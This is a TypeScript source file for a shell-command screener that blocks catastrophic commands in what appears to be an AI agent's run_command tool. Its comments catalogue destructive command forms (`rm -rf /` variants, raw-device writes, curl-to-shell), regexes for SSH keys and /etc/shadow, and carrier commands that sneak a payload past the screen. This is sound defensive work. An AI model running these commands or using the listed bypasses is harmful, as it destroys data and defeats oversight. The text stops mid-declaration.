/**
 * The run_command screener: `matchesCatastrophic` and the tables it reads.
 * tools.ts re-exports every name exported here, so its public surface is
 * unchanged.
 *
 * A leaf module: it imports only the shell parser and the OS case fold.
 * command-rules.ts takes the screener from here rather than from tools.ts,
 * which keeps the agent modules free of runtime import cycles.
 *
 * This file contains a literal NUL byte (the separator of the per-call dedup
 * key in `dangerousTarget`). Search tools that skip binary files skip this
 * file too; use `grep -a` or AST tooling.
 */
import { osFold } from '../os-fold.js';
import {
  braceCollapsed,
  braceExpansionsDepthFirst,
  braceExpansions,
  candidateArgvs,
  commandBasename,
  COMMAND_WRAPPERS,
  effectiveWords,
  HERESTRING_OP,
  parseShell,
  SHELL_OPERATORS,
  stripExpansions,
  type ParsedShell,
  type ShellWord,
  type SimpleCommand,
} from './shell-parse.js';

/**
 * A SMALL safety net (NOT a sandbox): hard-block obviously catastrophic
 * commands BEFORE the approval prompt, so even --yes cannot run them. The real
 * protections are the cwd, the approval prompt, and the timeout; OS-level
 * sandboxing is a later phase. Returns a reason string, or null when allowed.
 *
 * F-2c-4b - THE INSTRUMENT, NOT THE PATTERN. This used to be regexes over
 * RAW shell text. Measured at `a391ee88`, that axis failed in BOTH directions
 * at once: 42 of 59 catastrophic forms were ALLOWED (`rm -rf />/dev/null`,
 * `r\m -rf /`, `rm -r"f" /`, `dd of=/dev/loop0`) while 7 of 34 benign ones were
 * BLOCKED (`echo "rm -rf /" >> notes.md`). Simultaneously too narrow and too
 * wide IS the definition of the wrong axis, and it is not fixable by tuning:
 * widening the target terminator was measured to close 11 evasions while
 * ADDING 2 over-blocks and flipping two of `agent-command.test.ts`'s own
 * assertions red.
 *
 * So the screen now reads WORDS, via `parseShell`, and asks the question that
 * actually matters - "which word is the command, and what are its operands?"
 * There is exactly ONE instrument: the old regex screen is gone rather than
 * left standing beside this, because two mechanisms guarding one property are
 * a bypass surface by construction (F-2c-1's own best result).
 *
 * Still deliberately not exhaustive: encoded payloads (`base64 | sh`), `$IFS`
 * splicing and eval chains remain out of scope, and the approval prompt remains
 * the primary control.
 */
export function matchesCatastrophic(command: string): string | null {
  return screenShell(command, 0);
}

/**
 * The screen's MODELLING BUDGET for nested payloads (`sh -c`, `$( … )`, `eval`,
 * carriers, interpreters).
 *
 * EXPORTED SO THE DIFFERENTIAL'S CORPUS CAN DERIVE ITS REACH FROM IT
 * (F-2c-40). Review 3 measured the corpus that exists to falsify this screen and
 * found it topped out at TWO levels of recursion against this bound of THREE:
 * the one class this constant documents as a boundary was the one class the
 * instrument could never generate. A corpus that cannot reach a declared bound
 * reports a zero that carries no information about it.
 */
export const MAX_SCREEN_DEPTH = 3;

/**
 * Shells whose `-c` argument is another command to screen.
 *
 * F-2c-30 - `csh` and `tcsh` were absent and BOTH were proved to execute
 * `-c` payloads on this host; `fish` is added for parity with the sibling
 * declaration in `command-rules.ts`, which has carried all three since 1.10.
 * A name present in one of a package's two spellings of the same set and
 * missing from the other is the drift class this arc keeps re-filing.
 */
export const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'csh', 'tcsh', 'fish']);

/** Downloaders whose output piped into a shell is remote code execution. */
const DOWNLOADERS = new Set(['curl', 'wget', 'fetch']);

/**
 * F-2c-30 - THE CARRIER CLASS: A COMMAND WHOSE OPERAND IS ITSELF A COMMAND.
 *
 * `sh -c`, `eval` and the `COMMAND_WRAPPERS` prefix are three instances of ONE
 * property, and each was closed at its own instance. `trap '<payload>' EXIT`
 * came through next, and it is not exotic: measured over the differential's own
 * 58 cores, **988 shapes the published 0.6.0 refuses were allowed at HEAD**
 * across 24 carrier spellings, with `bare` and `env` as controls at 0.
 *
 * Membership here is decided BY EXECUTION, never by whether a name looks like a
 * carrier: every entry marked `executes` was run in a sandbox with a harmless
 * payload and observed to run it. `contract` entries are carriers by their
 * documented behaviour that this host cannot execute (they need authentication,
 * root, or a platform this machine is not) - recorded as carriers rather than
 * dropped, because "I could not run it" is not "it does not carry".
 *
 * TWO READINGS, APPLIED TO EVERY ENTRY - deliberately not one per carrier:
 * as a STRING - each operand is screened as a command string, so the
 * payload's POSITION never has to be modelled (`trap A SIG`,
 * `trap -- A SIG`, `su user -c A`).
 * as ARGV     - every SUFFIX of the argv is screened as a candidate command,
 * the same "we do not know which token is the command" rule the
 * unconfident fallback and the foreign-code path already use.
 * That is what stops an option taking a VALUE
 * (`xcrun --sdk macosx rm -rf /`) from hiding the command word,
 * without this file learning each carrier's option grammar.
 *
 * BOTH READINGS FOR EVERY ENTRY, BECAUSE CHOOSING ONE IS ITSELF A LIST.
 * The first form of this table tagged each name `'string' | 'argv'` - and the
 * differential's own carrier arm caught that tagging WRONG on its first run:
 * `runuser -u root -- rm -rf /` is argv-shaped and had been tagged a string
 * carrier, so all 46 of its shapes stayed open. A per-entry classification is a
 * hand-list nested inside a hand-list, with the same failure mode. Applying
 * both readings costs a bounded amount of extra screening and cannot be got
 * wrong; measured over the benign corpora, it over-blocks nothing.
 *
 * THE SET IS NOT THE CONTROL. `SHELL_RESERVED` was the list-shaped fix for
 * the previous instance of this class and `trap` is what came through after it.
 * What is different is that `screen-differential.test.ts` now carries the
 * carrier as a DIMENSION of its generator and re-derives the live shell builtin
 * set at run time, running an execution probe over every builtin on the host -
 * so a carrier nobody has thought of turns the gate red without being named.
 */
export const COMMAND_CARRIERS = new Set([
  'trap', //       executes: sh, bash, dash, zsh, ksh (EXIT / 0 / -- / multi-signal)
  'apply', //      executes: BSD apply(1) runs its first operand once per argument
  'npx', //        executes: `npx -c '<string>'`
  'find', //       executes: `find . -exec <argv> ';'`
  'caffeinate', // executes
  'taskpolicy', // executes
  'xcrun', //      executes
  'brew', //       executes: the `sh -c` subcommand
  'noglob', //     executes: zsh precommand modifier
  'emulate', //    executes: zsh, `emulate sh -c …`
  '-', //          executes: zsh precommand modifier (run as a login shell)
  'watch', //      contract: runs its operand through a shell, repeatedly
  'su', //         contract: `su [user] -c '<string>'` (darwin rejects a bare -c)
  'runuser', //    contract: `runuser -u USER -- <argv>` and `runuser -c '<string>'`
  'chroot', //     contract: needs root
  'flock', //      contract: Linux util-linux
  'unshare', //    contract: Linux
  'nsenter', //    contract: Linux
  // F-2c-42 - THE THIRD ESCAPE OF THIS LIST, AND THE REASON IT KEPT
  // HAPPENING. `SHELL_RESERVED` let `trap` through; `COMMAND_CARRIERS` let
  // `script` through. The arm F-2c-30 built to make the table non-load-bearing
  // derives its population from `compgen -b` and kin - **SHELL BUILTINS ONLY** -
  // so every external binary that runs an operand was outside the census BY
  // CONSTRUCTION and none of them could ever redden it. That census is widened
  // to the binaries on PATH in the same commit as these entries; the entries
  // are what the widened census then proves are needed.
  'script', //     contract: runs its operand in a pty (needs a TERMINAL, so a
  // piped-stdio probe cannot show it; proved interactively on this
  // host and by review 3's `F3-N5` with the repo's own harness)
  'busybox', //    contract: `busybox sh -c '<string>'` - the shell of every
  // Alpine image; absent on this host, recorded rather than dropped
]);

/**
 * F-2a #19 - INVERTED, NOT WIDENED. This was a hand-enumerated denylist of
 * block-device name prefixes (`sd|hd|disk|rdisk|nvme|vd`), duplicated across
 * two predicates. Measured at `a391ee88`, it allowed `/dev/xvda`, `/dev/mmcblk0`,
 * `/dev/md0`, `/dev/mapper/*`, `/dev/dm-0`, `/dev/loop0` and `/dev/nbd0` - and
 * widening it would only move the boundary, because the set of device names a
 * platform can have is unbounded and nothing binds a hand-list to it.
 *
 * An ALLOWLIST of the character devices it is normal to write is finite,
 * knowable, and closes the property: not on this list ⇒ treated as a raw
 * device. That is strictly tighter than what it replaces.
 */
export const SAFE_DEVICES = new Set([
  '/dev/null',
  '/dev/zero',
  '/dev/tty',
  '/dev/stdin',
  '/dev/stdout',
  '/dev/stderr',
  '/dev/random',
  '/dev/urandom',
  '/dev/full',
  '/dev/ptmx',
]);

/**
 * F-2c-45 (`C-PR31`) - THE ALLOWLIST WAS A LIST OF NAMES WHERE THE THING IT
 * MODELS IS A SET OF ROLES.
 *
 * `SAFE_DEVICES` above enumerates individual paths, so every pseudo-device that
 * comes in FAMILIES fell through to "raw device" and was refused. Measured at
 * HEAD against the published 0.6.0: **50 shapes** over `/dev/shm/*` (tmpfs, not
 * a device at all), `/dev/pts/*` (pty slaves) and the terminal/console family
 * were `0.6.0 allow → HEAD BLOCK` - and refused at `matchesCatastrophic`, which
 * throws before approval and before the command rules, so `--yes`, session
 * accept-all and an allow rule are all powerless against them. That is the
 * no-override over-block class F-2c-43 closed at the path anchor, at the one
 * site that fix did not reach.
 *
 * THIS IS STILL THE #19 INVERSION, NOT A RETURN TO A DENYLIST. The set of
 * device names a platform can have is unbounded, which is why naming the
 * dangerous ones failed; the set of ROLES it is ordinary to write is finite and
 * knowable, which is why naming the safe ones works. Adding a role is the same
 * move as the allowlist itself, one level up from a name.
 */
export const SAFE_DEVICE_ROLES = [
  '/dev/fd/', // file descriptors
  '/dev/shm/', // POSIX shared memory - tmpfs, not a device
  '/dev/pts/', // pseudo-terminal slaves
] as const;

/**
 * Terminals and the console: a family by NAME SHAPE rather than by prefix.
 *
 * F-9 / `C44` - THE LEGACY PSEUDO-TERMINAL REPLICAS. Published `0.6.0` has no
 * device screen at all, so every terminal node this screen refuses is a
 * `0.6.0 allow → HEAD block` cell - and it is refused at `matchesCatastrophic`,
 * which throws BEFORE approval and BEFORE the command rules, so `--yes`, session
 * accept-all and an allow rule are all powerless against it. Measured: **252 of
 * 267** distinct terminal-ish `/dev` nodes on this host were refused.
 *
 * THE CLASS SPLITS ON THE OPERATING SYSTEM'S OWN WORDS, AND ONLY HALF OF IT
 * MAY BE OPENED. `pty(4)`: *"anything written on the primary device is given to
 * the replica device as INPUT and anything written on the replica device is
 * presented as INPUT on the primary device."* So a write to a pty PRIMARY is
 * delivered to whatever process sits on the replica AS KEYSTROKES - allowing it
 * would open a command-injection path into another session. A write to a REPLICA
 * is the ordinary *"display text on that terminal"* operation, which is exactly
 * the role `ttys[0-9]+` above already allows.
 *
 * So the replicas join by their CLOSED NAME SHAPE - `tty` + one letter + one
 * hex digit, the documented BSD layout - and the primaries (`pty…`) deliberately
 * do NOT.  Matching `/dev/tty` or `/dev/pty` as a PREFIX FAMILY would admit
 * every primary too; `device-write-verbs.test.ts` carries a leg that fails if
 * this is ever widened that way, because no other leg can see it.
 *
 * The 128 primaries and the 6 serial ports stay refused and are PINNED as
 * `DEVICE_TERMINAL_MASTER_RESIDUAL` and `DEVICE_TERMINAL_SERIAL_RESIDUAL`, so
 * closing either turns those pins RED and forces a deliberate decision.
 */
const SAFE_DEVICE_TERMINALS = /^\/dev\/(?:console|tty[0-9]+|ttys[0-9]+|tty[p-za-e][0-9a-f])$/;

/**
 * F-7 - THE BSD DISK IDENTIFIER, AS A CLOSED FORM.
 *
 * diskutil(8) states the grammar exhaustively rather than by example: *"It may
 * take the form of diskU, diskUsP, diskUsQ, diskUsQsP, diskC, diskCsV, or
 * diskCsVsS where C, P, Q, S, U, and V are positive decimal integers"* - so one,
 * two and three numeric parts exhaust it, and THAT is why this enumeration can
 * be called complete rather than merely long.
 *
 * `rdisk9` is deliberately NOT matched. The `r` prefix belongs to the device
 * NODE spelling (`/dev/[r]disk*`); the identifier form list above has no `r`
 * variant, so accepting one would be widening past what the tool documents.
 */
const DISK_IDENTIFIER = /^disk\d+(?:s\d+){0,2}$/;

/**
 * The `/dev/` spelling of a target, for verbs whose own grammar also accepts the
 * bare identifier. For every other verb the target is returned untouched, which
 * is what keeps `cp ./disk9 /tmp/backup` allowed.
 */
function deviceSpelling(v: DeviceWriteVerb | undefined, target: string): string {
  if (v?.bareIdentifiers !== true) return target;
  return DISK_IDENTIFIER.test(target) ? `/dev/${target}` : target;
}

/** Writing here destroys a disk: anything under /dev/ that is not known-safe. */
function isRawDevice(target: string): boolean {
  // NORMALISE FIRST - A PREFIX FAMILY IS A PATH, AND A PATH CAN BE WALKED
  // OUT OF. Measured before this change: `echo x > /dev/fd/../sda` was ALLOWED
  // by HEAD *and* by the published 0.6.0, because the `/dev/fd/` family was
  // matched on the raw string. Adding three more families without the clamp
  // would have multiplied a hole rather than closed one. `normalizeTarget` is
  // the same `..` clamp `dangerousTarget` uses; this is its third anchored site.
  // F-11 / D1-1 - THE THIRD SITE OF THE ANCHOR CLASS, AND IT WAS MISSED
  // TWICE. F-2c-43 established that a reading produced by DELETING a leading
  // expansion is not entitled to conclude an absolute path - it does not reveal
  // the anchor, it INVENTS one - and closed that at `dangerousTarget` and at
  // `sensitiveTarget`. This predicate has the identical shape and was never
  // brought along, so `"$OUT/dev/tool.sh"` stripped to `/dev/tool.sh` and was
  // refused as a raw block device, with NO override of any kind: not `--yes`,
  // not a session accept-all, not an allow rule. The published 0.6.0 allows it.
  //
  // AND THE CORPUS COULD NOT SEE IT, FOR A REASON WORTH KEEPING. The benign
  // anchor dimension generated `${anchor}/${segment}` and stopped - `$OUT/dev`
  // strips to `/dev`, which does not start with `/dev/`, so the ONE depth it
  // produced was the ONE depth that passes. A corpus that generates only the
  // passing depth cannot see the failing one. `anchoredDepthReach()` now floors
  // that dimension on depth, the way the recursion dimension is floored on
  // `MAX_SCREEN_DEPTH`.
  //
  // Two readings, exactly as `dangerousTarget`: the word AS WRITTEN always
  // counts, and the stripped reading counts only when the word's own text fixes
  // where it starts. Priced over 43,401 cells: 882 ordinary commands stop being
  // refused, and ZERO of the raw-device cells move.
  const readings = anchorIsInText(target) ? [target, stripExpansions(target)] : [target];
  for (const base of readings) {
    const p = normalizeTarget(base).toLowerCase().replace(/\/+$/, '');
    if (!p.startsWith('/dev/')) continue;
    if (SAFE_DEVICES.has(p)) continue;
    if (SAFE_DEVICE_TERMINALS.test(p)) continue;
    if (SAFE_DEVICE_ROLES.some((prefix) => p.startsWith(prefix))) continue;
    return true;
  }
  return false;
}

/** SSH keys, shell-init files and system auth databases - injection or lockout. */
const SENSITIVE_FILE =
  /^(?:(?:~|\$\{?home\}?)\/\.(?:ssh(?:\/|$)|bash_profile|bash_login|bashrc|zshrc|zshenv|zprofile|profile|inputrc)|\/etc\/(?:passwd|shadow|sudoers))/i;

/**
 * Remove unexpanded expansions so a target can be judged on what it will
 * BECOME. `/$(true)` and `/${x}` both become `/` - an expansion can produce the
 * empty string, so screening only the literal text would miss them. The
 * ORIGINAL text is screened too (see `isDangerousTarget`), never instead.
 *
 * F-2c-42 - the implementation moved to `shell-parse.ts` and is imported
 * here. It is now used for the HEAD word as well as the target, and two copies
 * of one expansion model is the drift class this arc keeps re-filing.
 */
export { stripExpansions };

/**
 * F-2c-43 - THE PROTECTED SET IS A LIST, AND A LIST MUST BE READABLE BY THE
 * CORPUS THAT POLICES IT.
 *
 * These segments were spelled inline in a regex literal. Nothing could enumerate
 * them, so the benign corpus could not be built FROM them - and that is exactly
 * how `F-N6` survived: the over-block check sampled leaf names chosen by hand
 * (`build`, `dist`, `cache`, …), which are precisely the names NOT in this list,
 * so it measured zero over-blocking over a population that could not contain any.
 *
 * Exported so `tests/fixtures/screen-corpus.ts` DERIVES its benign
 * variable-anchored dimension from this array. Adding a segment here therefore
 * adds its over-block check in the same commit, mechanically. That direction of
 * derivation is sound - the benign corpus's job is to prove these exact names
 * are not refused. The HOSTILE corpus is deliberately NOT derived from here: a
 * corpus derived from the thing it exists to falsify cannot falsify it.
 */
export const SYSTEM_TREE_SEGMENTS = [
  'usr',
  'etc',
  'bin',
  'sbin',
  'var',
  'lib',
  'boot',
  'sys',
  'dev',
  'root',
  'opt',
  // F-2c-43 - macOS's OS tree. It sits HERE and not in the install-container
  // set below because `/System/Library` is the operating system, not a
  // removable unit: my first classification put it with `/Applications`, and
  // the pin `the home tree is protected …` refused that before it shipped.
  'system',
] as const;

const SYSTEM_DIR = new RegExp(`^/(${SYSTEM_TREE_SEGMENTS.join('|')})(/|$)`, 'i');

/**
 * F-2c-43 - THE PROTECTION SET OMITTED THE ONE TREE THE USER ACTUALLY OWNS.
 *
 * `SYSTEM_DIR` is the FHS. Measured at HEAD and at the published 0.6.0, ELEVEN
 * shapes were allowed by BOTH - `rm -rf /Users`, `/home`, `/Volumes`, `/mnt`,
 * `/srv`, … - so on macOS `rm -rf /Users` destroyed every home directory and no
 * net in the package said a word. Filed as `F-N2c` at review 2, re-filed at
 * review 3, open at both versions.
 *
 * THE GRANULARITY IS THE WHOLE DESIGN, and it is why this is two sets rather
 * than eleven more entries in the one above. A system tree is dangerous at ANY
 * depth: `/usr/lib/x` is as much the system as `/usr`. These are not - they are
 * CONTAINERS of independently owned units, and the unit boundary is exactly
 * where "catastrophic" stops:
 *
 * DATA containers hold a person's or a disk's entire contents. Losing the
 * container OR one whole unit is unrecoverable, so both are refused; two
 * levels down is `~/project/build`, where all ordinary work happens.
 * rm -rf /Users              ⇒ refuse (every home)
 * rm -rf /Users/alice        ⇒ refuse (one person's everything)
 * rm -rf /Users/alice/p/build ⇒ ALLOW  (an ordinary build directory)
 *
 * INSTALL containers hold software, and removing one app or one library is
 * ordinary maintenance, so only the container itself is refused.
 * rm -rf /Applications       ⇒ refuse (every app)
 * rm -rf /Applications/X.app ⇒ ALLOW  (an uninstall)
 *
 * THIS COULD NOT SAFELY HAVE LANDED BEFORE THE ANCHOR FIX BELOW, and that is
 * measured, not asserted: widening the protected set while `dangerousTarget`
 * still fabricated an anchor would have added **756 further ordinary commands**
 * to the no-override refusal (`rm -rf "$OUT/home"`, `chmod -R 755 "$OUT/library"`
 * …) - 9 new segments × 14 anchor spellings × 6 verbs. The two findings are one
 * mechanism pulling in opposite directions, and the order is forced.
 */
export const DATA_CONTAINER_SEGMENTS = ['users', 'home', 'volumes', 'mnt', 'media', 'srv'] as const;
export const INSTALL_CONTAINER_SEGMENTS = ['applications', 'library'] as const;

/** The container itself, or exactly one whole unit inside it. */
const DATA_CONTAINER = new RegExp(`^/(${DATA_CONTAINER_SEGMENTS.join('|')})(/\\*?|/[^/]+/?)?$`, 'i');
/** The container itself only. */
const INSTALL_CONTAINER = new RegExp(`^/(${INSTALL_CONTAINER_SEGMENTS.join('|')})(/\\*?)?$`, 'i');

const ROOT_OR_TILDE = new Set(['/', '/*', '~', '~/', '~/*']);

/**
 * F-2c-43 - A PATH'S ANCHOR IS NOT ALWAYS IN ITS TEXT.
 *
 * `stripExpansions` exists so a word can be judged on what it will BECOME:
 * `/$(true)` becomes `/`. That reading is sound when the word's FIRST character
 * already fixes where it starts. It is not sound when the first character
 * BEGINS an expansion, because then the anchor is whatever the expansion
 * yields, and deleting it does not reveal the anchor - it INVENTS one:
 *
 * "$OUT/lib"   --strip-->   "/lib"    a RELATIVE word read as ABSOLUTE
 *
 * That single line refused **858 ordinary commands** with no override route of
 * any kind - not `--yes`, not a session accept-all, not an allow rule - because
 * the refusal is thrown before all three. `rm -rf "$OUT/lib"` is a line in an
 * ordinary build script.
 *
 * AND THE SAME FAULT UNDER-BLOCKS, which is why it is one fix and not two.
 * `$HOME` DOES name an anchor. The stripper deleted it too, so `$HOME/../..`
 * lost the home it was measured from and nothing resolved the `..` - the shell
 * runs it against `/`. The identical shape spelled `~/../..` was refused,
 * because `normalizeTarget` has a `~` arm. **A control that exists at one site
 * is not a control**, so the two spellings are unified here rather than patched
 * one at a time. Measured: 42 shapes the published 0.6.0 refused and HEAD
 * allowed - a regression no corpus had ever been able to see.
 */
const LEADING_EXPANSION = /^(?:\$\(|`|\$\{|\$[A-Za-z_])/;

/**
 * Does this word's own text fix where it starts?
 *
 * THIS PREDICATE IS SMALLER THAN THE FIX THAT FIRST CARRIED IT, AND THE
 * MUTATION HARNESS IS WHY. The first spelling also classified `$HOME`/`~` as a
 * third, KNOWN anchor and rewrote `$HOME` onto `~` so `normalizeTarget`'s `~`
 * arm would resolve the `..` segments. It read well and it did nothing: the
 * mutation that deleted that rewrite left the whole suite GREEN. The `..` clamp
 * added alongside it already closes every `$HOME` shape - `$HOME/../..` strips
 * to `/../..`, which clamps to `/` - so the rewrite was decoration on a working
 * mechanism. A component no mutation can make matter is not a mechanism, and
 * this arc's own standard is that it comes out.
 *
 * The two spellings are therefore closed by two DIFFERENT mechanisms (`~` by
 * `normalizeTarget`'s arm, `$HOME` by the clamp), which is exactly the shape
 * that produced the defect in the first place - so the class is held together
 * by a pin that asserts the spellings AGREE shape by shape, and that pin is
 * mutation-proved to bind.
 */
function anchorIsInText(v: string): boolean {
  return !LEADING_EXPANSION.test(v);
}

/**
 * F-2c-25 - PATH SPELLINGS THAT NAME THE SAME PLACE.
 *
 * `//`, `//*`, `~//` and `~/./*` are the filesystem root and HOME under other
 * names - a shell resolves them identically. The published 0.6.0 blocked all
 * four because its regex matched characters rather than a set; the word-axis
 * screen compared the operand against a literal SET and missed every spelling
 * not in it. Measured: **84 shapes** on this cause.
 *
 * It also resolves `..` LEXICALLY. That closes a gap BOTH nets had - measured,
 * `rm -rf /tmp/../etc` was missed by the published 0.6.0 and by HEAD - and it
 * is safe in the benign direction because a `..` is only ever removed together
 * with the named segment before it (`build/../dist` → `dist`).
 */
function normalizeTarget(v: string): string {
  let s = v.replace(/\/{2,}/g, '/');
  while (s.includes('/./')) s = s.replace(/\/\.\//g, '/');
  s = s.replace(/\/\.$/, '/');
  if (!s.includes('..')) return s;
  const absolute = s.startsWith('/');
  const trailing = s.endsWith('/');
  const parts = s.split('/').filter((p) => p.length > 0);
  const stack: string[] = [];
  for (const p of parts) {
    const top = stack[stack.length - 1];
    // F-2c-43 - POSIX CLAMPS `..` AT THE ROOT: `/..` IS `/`, not a place
    // above it. Without this the stack simply accumulated the extra `..` and
    // `rm -rf /tmp/../..` - which every shell resolves to `/` - normalised to
    // the string `/..`, matched nothing, and was allowed by HEAD *and* by the
    // published 0.6.0. A gap at both versions, found by walking the `..` axis
    // rather than by reading the rule.
    if (p === '..' && absolute && stack.length === 0) continue;
    if (p === '..' && top !== undefined && top !== '..' && top !== '.' && !(stack.length === 1 && top === '~')) {
      stack.pop();
      continue;
    }
    if (p === '..' && stack.length === 1 && stack[0] === '~') {
      // `~/..` is the parent of HOME - treat it as HOME rather than inventing a
      // path, so the ROOT_OR_TILDE test still recognises it.
      continue;
    }
    stack.push(p);
  }
  const joined = stack.join('/');
  return (absolute ? '/' : '') + joined + (trailing && joined.length > 0 ? '/' : '');
}

/**
 * F-2c-43 - THE SECOND SITE OF THE ANCHOR CLASS.
 *
 * `SENSITIVE_FILE`'s `/etc/(passwd|shadow|sudoers)` alternative is anchored at
 * `^/` exactly as `SYSTEM_DIR` was, and it was tested against
 * `stripExpansions(target)` in the same way - so `echo x > "$OUT/etc/passwd"`
 * fabricated the same absolute anchor and was refused. Measured before this
 * fix: 5 of 6 spellings refused at HEAD, 0 of 6 at the published 0.6.0.
 *
 * Fixing `dangerousTarget` alone would have closed the class AT ONE SITE, and
 * this arc has now recorded four separate occasions on which that was mistaken
 * for closing it. One predicate, both call sites - the redirect loop and `tee`,
 * which previously disagreed with each other anyway (`tee` tested only the raw
 * text, so it MISSED `tee "/etc/$(echo)passwd"` that the redirect loop caught).
 */
function sensitiveTarget(value: string): boolean {
  // F-22 - the `/i` flag folds ASCII case ONLY. `osFold` adds the
  // spellings the FILESYSTEM folds (`/etc/paſſwd`, `/etc/paßwd`). Offered
  // ALONGSIDE the raw reading, so this can only ever add refusals.
  if (SENSITIVE_FILE.test(value) || SENSITIVE_FILE.test(osFold(value))) return true;
  // The stripped reading may only conclude an absolute path when the word's own
  // text says where it starts. `~`/`$HOME` spellings are matched above, raw.
  if (!anchorIsInText(value)) return false;
  const stripped = stripExpansions(value);
  return SENSITIVE_FILE.test(stripped) || SENSITIVE_FILE.test(osFold(stripped));
}

/**
 * '' when the operand is ordinary; otherwise the reason it is catastrophic.
 *
 * F-2c-43 - every reading now carries whether it is entitled to conclude that
 * the path is INSIDE a protected tree. A reading produced by deleting a leading
 * expansion is not: it knows the word ends in `/lib`, and it does not know what
 * that `lib` hangs off. It may still conclude the word names the anchor ITSELF
 * (`$X/` is the whole of `$X`, and `/` when `$X` is empty), which is why the
 * root test runs for every reading and only the tree tests are gated.
 */
function dangerousTarget(value: string): string | null {
  /** Each reading, with whether it may conclude "inside a protected tree". */
  const readings: Array<[string, boolean]> = [
    [value, true],
    [stripExpansions(value), anchorIsInText(value)],
  ];

  const seen = new Set<string>();
  for (const [base, mayConcludeTree] of readings) {
    for (const candidate of [base, normalizeTarget(base)]) {
      // F-22 - TWO foldings, offered together and deduped by
      // `seen`: `toLowerCase` as before, and `osFold`, which additionally
      // reproduces the ten scalars the FILESYSTEM folds and `toLowerCase`
      // does not (`/uſr`, `/Uſerſ`, `/Syﬆem`). Adding a reading can only
      // ever ADD refusals - no target refused today becomes allowed.
      for (const lc of [candidate.toLowerCase(), osFold(candidate)]) {
        const key = `${mayConcludeTree ? '1' : '0'} ${lc}`;
        if (seen.has(key)) continue;
        seen.add(key);
        if (ROOT_OR_TILDE.has(lc)) return 'on / ~ or $HOME';
        if (/^\$\{?home\}?(\/\*?)?$/.test(lc)) return 'on / ~ or $HOME';
        // m1: ~user expansion (e.g. ~root) - tilde followed by username
        if (/^~[a-z_][a-z0-9_-]*(\/.*)?$/.test(lc)) return 'on / ~ or $HOME';
        if (!mayConcludeTree) continue;
        if (SYSTEM_DIR.test(lc)) return 'on a system directory';
        if (DATA_CONTAINER.test(lc)) return 'on a user home directory or mounted volume';
        if (INSTALL_CONTAINER.test(lc)) return 'on the system applications/library directory';
      }
    }
  }
  return null;
}

/**
 * F-2c-47 - THE CLASSIFIER WAS RIGHT; THE COVERAGE WAS WRONG.
 *
 * `isRawDevice` was consulted at exactly three places: redirect targets,
 * `dd of=` and `tee`. Every other way of naming a device node walked past it.
 * Filed as 42 shapes over two verbs (`cp ./f /dev/sda`, `chmod 666 /dev/sda`);
 * the 42 reproduces and it is not the population. Counted from the OPERATING
 * SYSTEM'S grammar rather than from the predicate - each verb's write position
 * read off its own SYNOPSIS - the class is **34 verbs × 21 raw targets = 714
 * cells, and HEAD allowed 714 of 714**, plus 136 of 136 `..` traversals that
 * re-entered through the verbs the redirect rule never sees.
 *
 * MEASURED: `isRawDevice` is correct on 21 of 21 of these paths - the
 * redirect form refuses every one. So this is a VERB-COVERAGE defect, and
 * `C-PR31` (the 50-shape over-block) was an AXIS defect in the classifier.
 * *Two different defects at two sites of one mechanism, not one axis error
 * showing two faces.* The classifier is therefore reused unchanged, which is
 * what keeps `C-PR31` closed while this direction closes.
 *
 * THE ROLE IS THE UTILITY'S OWN, NOT A GUESS. `cp source_file target_file`
 * names its destination; `chmod mode file ...` names every operand after the
 * mode. Screening the WRITE POSITION rather than every operand is the whole
 * difference between refusing nothing ordinary and refusing disk imaging:
 * measured against a 2,094-shape benign corpus, screening every operand of
 * these verbs costs 273 over-blocks and screening every operand of every
 * command costs 420, while the write position alone costs **0**.
 */
type DeviceTargetRole = 'last' | 'all' | 'after-first' | 'first' | 'archive';

interface DeviceWriteVerb {
  /** which operands the utility's own synopsis puts in a write/alter position */
  readonly role: DeviceTargetRole;
  /**
   * AN ALLOWLIST OF READ-ONLY MODES - the #19 inversion, one level down.
   * The archivers and the partition editors take the device in the SAME
   * position for reading and for writing (`tar cf DEV .` vs `tar xf DEV`,
   * `parted DEV mklabel` vs `parted DEV print`). The destructive sub-commands
   * are unbounded and grow with the tool; the READ-ONLY modes are finite and
   * documented. So the read modes are named and everything else aimed at a raw
   * device is screened - an unrecognised mode fails SAFE.
   *
   * This list is load-bearing and every member must be read-only on EVERY
   * platform. `-u` was in `fdisk`'s during measurement, read as Linux's "units
   * in sectors"; on macOS `fdisk -u DEV` UPDATES THE MBR BOOT CODE. 21 cells
   * sat behind that one token. `tests/device-write-verbs.test.ts` pins the
   * destructive modes for exactly this reason.
   */
  readonly readModes?: readonly string[];
  /** a read mode spelled as a letter inside a bundled word, e.g. `tar xf` */
  readonly readLetters?: string;
  /**
   * THE ONE INVERTED MEMBER, NAMED SO IT IS NOT COPIED BY HABIT. `pax` with
   * no mode is LIST - reading. Its write modes are the complete POSIX set
   * {`-w`}, so it is screened only when one is present. Every other verb here
   * screens by default; this one does not, and that is the direction that can
   * under-block, which is why its grammar is closed rather than sampled.
   */
  readonly writeModes?: readonly string[];
  /** for `archive`: the flag whose VALUE names the archive */
  readonly flag?: string;
  /**
   * WHERE A BARE-WORD MODE SITS - read off the utility's own SYNOPSIS.
   *
   * Only needed where a read mode is spelled as a SUB-COMMAND: `nvme list` and
   * `diskutil info DEV` take theirs as the first argument, `parted DEV print`
   * takes its after the device. An OPTION-spelled mode (`-l`, `--list`) needs no
   * anchor - its own spelling puts it in option position and an ordinary operand
   * cannot equal one - so omitting this field means every read mode of the verb
   * is option-spelled. `device-write-verbs.test.ts` refuses a bare-word read
   * mode that does not declare this, which is what stops the defect below being
   * re-introduced by adding a verb.
   */
  readonly modeAt?: 'first-argument' | 'after-device';
  /**
   * F-7 - THE VERB'S OWN GRAMMAR ACCEPTS A BARE BSD DISK
   * IDENTIFIER, NOT ONLY A `/dev/` PATH.
   *
   * `isRawDevice` models a device as *a path under `/dev/`*. Two utilities on
   * this platform declare otherwise in their own words:
   *
   * diskutil(8)    every destructive synopsis ends
   * `MountPoint|DiskIdentifier|DeviceNode`, and its own
   * examples use the bare form (`diskutil eraseDisk JHFS+
   * UntitledUFS disk3`). It is also the spelling a person
   * actually types, because `diskutil list` prints it.
   * newfs_apfs(8)  "should be the path to a disk device node, such as
   * /dev/disk1s2, although can be specified as simply
   * disk1s2."
   *
   * ONLY VERBS THAT DECLARE IT GET IT, and that scoping is the whole
   * over-block bound: `disk9` is a perfectly ordinary FILENAME, so `cp ./disk9
   * /tmp/backup` and `tar cf out.tar disk9` must stay allowed. A global
   * widening of `isRawDevice` would refuse every one of them.
   */
  readonly bareIdentifiers?: true;
  /**
